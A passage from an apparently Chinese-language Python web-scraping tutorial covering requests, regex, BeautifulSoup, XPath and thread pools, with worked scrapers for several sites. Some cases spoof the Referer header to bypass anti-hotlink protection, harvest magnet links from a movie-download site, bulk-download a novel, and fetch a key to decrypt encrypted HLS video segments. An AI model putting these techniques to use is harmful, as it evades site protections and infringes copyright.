class="subst">&#123;json_str&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="POST">1.1.3. POST</h3><h4 id="案例：百度翻译">1.1.3.1. 案例：百度翻译</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = <span class="built_in">input</span>(<span class="string">&quot;请输入你要翻译的英文单词&quot;</span>)</span><br><span class="line">url = <span class="string">&quot;https://fanyi.baidu.com/sug&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;kw&#x27;</span>:s</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#以字典的方式放在data参数中去请求</span></span><br><span class="line">response = requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(response.json())</span><br></pre></td></tr></table></figure>

<h3 id="防盗链">1.1.4. 防盗链</h3><h4 id="案例：抓取梨视频源文件链接">1.1.4.1. 案例：抓取梨视频源文件链接</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#部分链接通过改变参数来阻止爬虫直接获取链接</span></span><br><span class="line">url = <span class="string">&quot;https://www.pearvideo.com/video_1750583&quot;</span></span><br><span class="line">contId = url.split(<span class="string">&#x27;_&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">video_statusURL = <span class="string">f&#x27;https://www.pearvideo.com/videoStatus.jsp?contId=<span class="subst">&#123;contId&#125;</span>&amp;mrd=0.05754613101901107&#x27;</span></span><br><span class="line"><span class="comment">#Referer字段是防盗链，溯源请求的上一级</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: url</span><br><span class="line">&#125;</span><br><span class="line">res = requests.get(video_statusURL,headers=headers)</span><br><span class="line"><span class="comment">#转换为json格式可从子节点逐级寻找</span></span><br><span class="line">video = res.json()[<span class="string">&#x27;videoInfo&#x27;</span>][<span class="string">&#x27;videos&#x27;</span>][<span class="string">&#x27;srcUrl&#x27;</span>]</span><br><span class="line">systemtime = res.json()[<span class="string">&#x27;systemTime&#x27;</span>]</span><br><span class="line">video1 = video.replace(systemtime,<span class="string">f&#x27;cont-<span class="subst">&#123;contId&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(video1)</span><br></pre></td></tr></table></figure>

<h2 id="Re-正则表达式">1.2. Re-正则表达式</h2><h3 id="基础介绍-2">1.2.1. 基础介绍</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">#正则表达式测试网址：https://tool.oschina.net/regex/</span><br><span class="line">#下列字符被称为元字符（默认只匹配一个字符）</span><br><span class="line">&#123;</span><br><span class="line">.       匹配除换行符意外的其他任意字符</span><br><span class="line">\w      匹配字母|数字|下划线|汉字</span><br><span class="line">\s      匹配任意的空白符</span><br><span class="line">\d      匹配数字</span><br><span class="line">\n      匹配一个换行符</span><br><span class="line">\t      匹配一个制表符</span><br><span class="line">\b		代表单词边界</span><br><span class="line">\r		代表回车，光标向下一行</span><br><span class="line"></span><br><span class="line">^       匹配字符串的开始</span><br><span class="line">$       匹配字符串的结尾</span><br><span class="line">    </span><br><span class="line">\W      匹配非字母|数字|下划线</span><br><span class="line">\D      匹配非数字</span><br><span class="line">\S      匹配非空白符</span><br><span class="line">()      匹配括号内的表达式，也表示一个组</span><br><span class="line">[...]   匹配字符组中的字符</span><br><span class="line">[^...]  匹配除了字符组中字符的所有字符</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#量词：控制元字符出现的次数</span><br><span class="line">&#123;</span><br><span class="line">*       重复0次或以上</span><br><span class="line">+       重复1次或以上</span><br><span class="line">?       重复0次或1次</span><br><span class="line">&#123;n&#125;     重复n次</span><br><span class="line">&#123;n,&#125;    重复n次或以上</span><br><span class="line">&#123;n,m&#125;   重复n到m次</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#贪婪匹配和非贪婪匹配</span><br><span class="line">.*      贪婪匹配，尽可能多的匹配</span><br><span class="line">.*?     非贪婪匹配，尽可能少的匹配</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text1 = <span class="string">&quot;我的qq邮箱是1554089600@qq.com，你的邮箱是1554089600@163.com&quot;</span></span><br><span class="line"><span class="comment">#1、compile()预加载正则</span></span><br><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">&quot;\d+.\w+.\w+&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#2、findall()匹配所有符合正则表达式的内容，返回的是列表</span></span><br><span class="line">list1 = obj.findall(text1)</span><br><span class="line"><span class="built_in">print</span>(list1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#3、finditer()匹配所有符合正则表达式的内容,返回的是迭代器，从迭代器中拿到内容需要.group()</span></span><br><span class="line">it = obj.finditer(text1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> it:</span><br><span class="line">    <span class="built_in">print</span>(i.group())</span><br><span class="line"></span><br><span class="line"><span class="comment">#4、search()匹配第一个符合正则表达式的内容,返回的是match对象，拿出内容需要.group()</span></span><br><span class="line">s = obj.search(text1)</span><br><span class="line"><span class="built_in">print</span>(s.group())</span><br><span class="line"></span><br><span class="line"><span class="comment">#5、match()从头开始匹配符合的正则表达式，等同于^，拿出内容需要.group()，None时不能使用.group()</span></span><br><span class="line">m = obj.match(text1)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>

<h3 id="案例1：抓取福布斯中国排行榜">1.2.2. 案例1：抓取福布斯中国排行榜</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;https://www.forbeschina.com/lists/1773&quot;</span></span><br><span class="line">html = requests.get(url,headers=headers)</span><br><span class="line">res = html.content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment">#(?P&lt;分组名字&gt;正则)给匹配正则的字符串命名，可以在后续的group()中取出</span></span><br><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;td&gt;(?P&lt;a&gt;.*?)&lt;/td&gt;&#x27;</span>,re.S)<span class="comment">#re.S能让.匹配换行符</span></span><br><span class="line">it = obj.finditer(res)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> it:</span><br><span class="line">    <span class="built_in">print</span>(i.group(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">html.close()</span><br></pre></td></tr></table></figure>

<h3 id="案例2：获得豆瓣电影top250">1.2.3. 案例2：获得豆瓣电影top250</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&quot;https://movie.douban.com/top250&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;start&quot;</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;filter&quot;</span>:<span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.get(url,params=params,headers=headers).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">obj1 = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;li&gt;.*?&lt;img width=&quot;100&quot; alt=&quot;(?P&lt;moviename&gt;.*?)&quot; src=.*?(?P&lt;year&gt;\d+)&amp;nbsp;.*?(?P&lt;score&gt;\d\W\d)&lt;/span&gt;&#x27;</span>,re.S)</span><br><span class="line">result1 = obj1.finditer(res)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result1:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;电影：<span class="subst">&#123;i.group(<span class="string">&quot;moviename&quot;</span>)&#125;</span>,年份：<span class="subst">&#123;i.group(<span class="string">&quot;year&quot;</span>)&#125;</span>，评分：<span class="subst">&#123;i.group(<span class="string">&quot;score&quot;</span>)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="案例3：获取电影天堂磁力链接">1.2.4. 案例3：获取电影天堂磁力链接</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#正则匹配子页网址</span></span><br><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;a href=&quot;(?P&lt;urlspl&gt;.*?)&quot; class=&quot;ulink&quot;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#控制抓取页数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">2</span>):</span><br><span class="line">    url = <span class="string">f&#x27;https://www.dytt8.net/html/tv/hytv/list_71_<span class="subst">&#123;i&#125;</span>.html&#x27;</span></span><br><span class="line"></span><br><span class="line">    res = requests.get(url,headers=headers).content.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">    <span class="comment">#获取每个子页的网址</span></span><br><span class="line">    result = obj.finditer(res)</span><br><span class="line">    <span class="keyword">for</span> it <span class="keyword">in</span> result:</span><br><span class="line">        <span class="comment">#将子页网址进行拼接</span></span><br><span class="line">        url_correct = <span class="string">f&#x27;https://www.dytt8.net/<span class="subst">&#123;it.group(<span class="string">&quot;urlspl&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">        res = requests.get(url_correct, headers=headers).content.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">        <span class="comment">#正则匹配磁力链接</span></span><br><span class="line">        obj1 = re.<span class="built_in">compile</span>(<span class="string">&#x27;.mp4&quot;&gt;(?P&lt;download&gt;.*?)&lt;/a&gt;&lt;/td&gt;&#x27;</span>)</span><br><span class="line">        result1 = obj1.finditer(res)</span><br><span class="line">        <span class="keyword">for</span> it1 <span class="keyword">in</span> result1:</span><br><span class="line">            <span class="built_in">print</span>(it1.group(<span class="string">&#x27;download&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h2 id="Beautiful-Soup">1.3. Beautiful Soup</h2><h3 id="基础介绍-3">1.3.1. 基础介绍</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">response = requests.get(url,headers=headers).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">soup = BeautifulSoup(response,<span class="string">&quot;lxml&quot;</span>)<span class="comment">#创建对象，lxml是bs4的指定解析器</span></span><br><span class="line"><span class="comment">#按照html标准的缩进格式的结构输出,且会自动补齐成对标签</span></span><br><span class="line"><span class="built_in">print</span>(soup.prettify())</span><br><span class="line"></span><br><span class="line">findAll()以列表的形式显示所有符合的标签</span><br><span class="line">用法：findAll(标签，属性=值，[数量]),</span><br><span class="line">标签可以单个，多个时需加[]如[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;p&#x27;</span>] </span><br></pre></td></tr></table></figure>

<h3 id="案例：抓取qq音乐热歌榜-歌名、歌手、歌曲链接">1.3.2. 案例：抓取qq音乐热歌榜,歌名、歌手、歌曲链接</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">url = <span class="string">&quot;https://y.qq.com/n/ryqq/toplist/26&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.get(url,headers=headers).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">soup = BeautifulSoup(response,<span class="string">&quot;lxml&quot;</span>)<span class="comment">#创建对象，lxml是bs4的指定解析器</span></span><br><span class="line"><span class="comment">#匹配所有img且标签为属性class值为songlist__pic</span></span><br><span class="line">m = soup.findAll(<span class="string">&quot;img&quot;</span>,attrs=&#123;<span class="string">&quot;class&quot;</span>:<span class="string">&quot;songlist__pic&quot;</span>&#125;)</span><br><span class="line">n = soup.findAll(<span class="string">&quot;a&quot;</span>,attrs=&#123;<span class="string">&quot;class&quot;</span>:<span class="string">&quot;playlist__author&quot;</span>&#125;)</span><br><span class="line"><span class="comment">#遍历标签</span></span><br><span class="line"><span class="keyword">for</span> music <span class="keyword">in</span> m:</span><br><span class="line">    <span class="built_in">print</span>(music.get(<span class="string">&#x27;alt&#x27;</span>))<span class="comment">#获取具体某个属性的值</span></span><br><span class="line"><span class="keyword">for</span> singer <span class="keyword">in</span> n:</span><br><span class="line">    <span class="built_in">print</span>(singer.get(<span class="string">&#x27;title&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;歌曲：<span class="subst">&#123;m.get(<span class="string">&quot;alt&quot;</span>)&#125;</span>，歌手：<span class="subst">&#123;n.get(<span class="string">&quot;title&quot;</span>)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Xpath">1.4. Xpath</h2><h3 id="基础介绍-4">1.4.1. 基础介绍</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#lxml的etree模块中才包含xpath解析</span></span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="comment">#xml声明只能在开头进行</span></span><br><span class="line">xml = <span class="string">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;bookstore&gt;</span></span><br><span class="line"><span class="string">    &lt;book&gt;</span></span><br><span class="line"><span class="string">      &lt;div&gt;</span></span><br><span class="line"><span class="string">      &lt;title lang=&quot;eng&quot;&gt;Harry Potter1&lt;/title&gt;</span></span><br><span class="line"><span class="string">      &lt;price&gt;29.99&lt;/price&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">        &lt;title lang=&quot;eng&quot;&gt;Harry Potter2&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;price&gt;29.99&lt;/price&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;span&gt;</span></span><br><span class="line"><span class="string">        &lt;title lang=&quot;eng&quot;&gt;Harry Potter3&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;price&gt;29.99&lt;/price&gt;</span></span><br><span class="line"><span class="string">        &lt;/span&gt;</span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/book&gt;</span></span><br><span class="line"><span class="string">    &lt;parent&gt;</span></span><br><span class="line"><span class="string">      &lt;title lang=&quot;eng&quot;&gt;Learning XML&lt;/title&gt;</span></span><br><span class="line"><span class="string">      &lt;price&gt;39.95&lt;/price&gt;</span></span><br><span class="line"><span class="string">    &lt;/parent&gt;</span></span><br><span class="line"><span class="string">&lt;/bookstore&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">xml = xml.encode(<span class="string">&#x27;utf-8&#x27;</span>)<span class="comment">#将文档设置编码格式</span></span><br><span class="line">tree = etree.XML(xml)<span class="comment">#创建对象</span></span><br><span class="line">result = tree.xpath(<span class="string">&quot;book/div/title&quot;</span>)<span class="comment">#寻找book下的title子节点</span></span><br><span class="line">result1 = tree.xpath(<span class="string">&quot;book/div/title/text()&quot;</span>)<span class="comment">#text()拿取文本</span></span><br><span class="line"><span class="built_in">print</span>(result1)</span><br><span class="line">result2 = tree.xpath(<span class="string">&quot;book/div//title/text()&quot;</span>)<span class="comment">#//可以拿取父节点下所有符合的子节点，子节点的子节点...</span></span><br><span class="line"><span class="built_in">print</span>(result2)</span><br><span class="line">result3 = tree.xpath(<span class="string">&quot;//title/text()&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(result3)</span><br></pre></td></tr></table></figure>

<h3 id="案例：获取浙理工某网站的所有a标签的herf的属性值">1.4.2. 案例：获取浙理工某网站的所有a标签的herf的属性值</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">url = <span class="string">&quot;https://sky.zstu.edu.cn/sy.htm&quot;</span></span><br><span class="line">res = requests.get(url).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">tree = etree.HTML(res)</span><br><span class="line"><span class="comment">#抓取网页中a标签的所有a标签的href值</span></span><br><span class="line">url_link = tree.xpath(<span class="string">&#x27;//a/@href&#x27;</span>)<span class="comment">#@xxx代表属性值</span></span><br><span class="line"><span class="built_in">print</span>(url_link)</span><br><span class="line"><span class="comment">#在网页对应内容的源码中右键复制xpath可直接获得当前内容的xpath！！</span></span><br></pre></td></tr></table></figure>

<h2 id="多线程">1.5. 多线程</h2><h3 id="基础介绍-5">1.5.1. 基础介绍</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;func<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    t = Thread(target=func)<span class="comment">#创建线程对象</span></span><br><span class="line">    t.start()<span class="comment">#将线程状态设置为开启</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;main<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment">#运行时可以观察到func和main函数是同时打印</span></span><br></pre></td></tr></table></figure>

<h2 id="线程池">1.6. 线程池</h2><h3 id="案例：获取整本斗破苍穹小说">1.6.1. 案例：获取整本斗破苍穹小说</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor<span class="comment">#导入线程池</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getbook</span>(<span class="params">url,page</span>):<span class="comment">#先写抓取某一页的函数</span></span><br><span class="line">    res = requests.get(url,headers=headers).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    tree = etree.HTML(res)</span><br><span class="line">    content = tree.xpath(<span class="string">&#x27;//*[@id=&quot;content&quot;]/p/text()&#x27;</span>)</span><br><span class="line">    novel = <span class="built_in">str</span>(content).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;[&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;]&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;,&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">f&#x27;e:\\test\\<span class="subst">&#123;page&#125;</span>.txt&#x27;</span>,mode=<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    f.write(novel)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># for i in range(1,2):                    #效率低下</span></span><br><span class="line">    <span class="comment">#     url = f&#x27;http://www.doupo321.com/doupocangqiong/&#123;i&#125;.html&#x27;</span></span><br><span class="line">    <span class="comment">#     getbook(url,page=i)</span></span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(<span class="number">50</span>) <span class="keyword">as</span> t:<span class="comment">#开辟50个线程为线程池</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):<span class="comment">#获取200章</span></span><br><span class="line">            t.submit(getbook,url=<span class="string">f&#x27;http://www.doupo321.com/doupocangqiong/<span class="subst">&#123;i&#125;</span>.html&#x27;</span>,page=i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;done&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="案例：抓取美剧网勿言推理视频的第一集">1.6.2. 案例：抓取美剧网勿言推理视频的第一集</h3><p>[勿言推理第一集]: <a href="http://www.meijuwang.cc/w/wuyantuili-1-1.html">http://www.meijuwang.cc/w/wuyantuili-1-1.html</a>	“视频链接”</p>
<hr>
<ul>
<li><input checked disabled type="checkbox"> #1、找到m3u8文件</li>
<li><input checked disabled type="checkbox"> #2、通过m3u8下载到ts文件</li>
<li><input checked disabled type="checkbox"> #3、获取密钥进行解密ts文件</li>
<li><input checked disabled type="checkbox"> #4、把ts文件合并为一个mp4文件</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment">#1、查看页面源码找到视频信息，用正则将需要的视频框架取出</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">iframe</span>(<span class="params">url</span>):</span><br><span class="line">    resp = requests.get(url, headers=headers)</span><br><span class="line">    obj = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&quot;link_pre&quot;:&quot;&quot;,&quot;url&quot;:&quot;(?P&lt;url&gt;.*?)&quot;,&quot;url_next&#x27;</span>, re.S)</span><br><span class="line">    result = obj.search(resp.text).group(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    result = result.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    resp.close()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment">#2、找到m3u8文件正确的下载地址</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">m3u8</span>(<span class="params">url</span>):</span><br><span class="line">    resp = requests.get(url,headers=headers).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    spl_url = url.split(<span class="string">&#x27;/share&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    obj = re.<span class="built_in">compile</span>(<span class="string">r&#x27;url&quot;:&quot;(?P&lt;m3u8_link&gt;.*?)&quot;&#125;]&#x27;</span>,re.S)</span><br><span class="line">    result = obj.search(resp).group(<span class="string">&#x27;m3u8_link&#x27;</span>)</span><br><span class="line">    resp.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;<span class="subst">&#123;spl_url&#125;</span><span class="subst">&#123;result&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3、获取m3u8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_m3u8</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment"># 下载m3u8文件，执行完一次后注释</span></span><br><span class="line">    resp = requests.get(url, headers=headers)</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;勿言推理1.m3u8&#x27;</span>, mode=<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    f.write(resp.content)</span><br><span class="line">    resp.close()</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;http://www.meijuwang.cc/w/wuyantuili-1-1.html&#x27;</span></span><br><span class="line">    if_url = iframe(url=url)</span><br><span class="line">    m3u8_link = m3u8(url=if_url)</span><br><span class="line">    get_m3u8(url=m3u8_link)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#4、下载ts文件</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">ts_line = []</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_ts</span>():<span class="comment">#下载加密的ts片段</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;勿言推理1.m3u8&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> line.startswith(<span class="string">&#x27;#&#x27;</span>) <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">            line = line.strip()</span><br><span class="line">            ts_line.append(line)</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ts_line)):</span><br><span class="line">        resp = requests.get(url=ts_line[i])</span><br><span class="line">        f1 = <span class="built_in">open</span>(<span class="string">f&#x27;video\\<span class="subst">&#123;i&#125;</span>.ts&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        f1.write(resp.content)</span><br><span class="line">        f1.close()</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    download_ts()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#5、获取key并解密ts文件</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES<span class="comment">#找到python3的安装目录下的Lib—-site-package将crypto文件夹改名为Crypto</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    obj = re.<span class="built_in">compile</span>(<span class="string">&#x27;URI=&quot;(?P&lt;key&gt;.*?)&quot;&#x27;</span>)</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;勿言推理1.m3u8&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    lines = f.read()</span><br><span class="line">    keys = obj.search(lines).group(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line">    resp = requests.get(url=keys).text</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec_ts</span>(<span class="params">key</span>):<span class="comment">#将所有片段进行解密</span></span><br><span class="line">    aes = AES.new(key=key.encode(<span class="string">&#x27;utf-8&#x27;</span>), IV=<span class="string">b&#x27;0000000000000000&#x27;</span>, mode=AES.MODE_CBC)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ts_line)):</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">f&#x27;video\\<span class="subst">&#123;i&#125;</span>.ts&#x27;</span>, mode=<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        f1 = <span class="built_in">open</span>(<span class="string">f&#x27;video2\\<span class="subst">&#123;i&#125;</span>.ts&#x27;</span>, mode=<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        no_dec = f.read()</span><br><span class="line">        f1.write(aes.decrypt(no_dec))</span><br><span class="line">        f.close()</span><br><span class="line">        f1.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key1 = get_key()</span><br><span class="line">    dec_ts(key=key1)</span><br></pre></td></tr></table></figure>

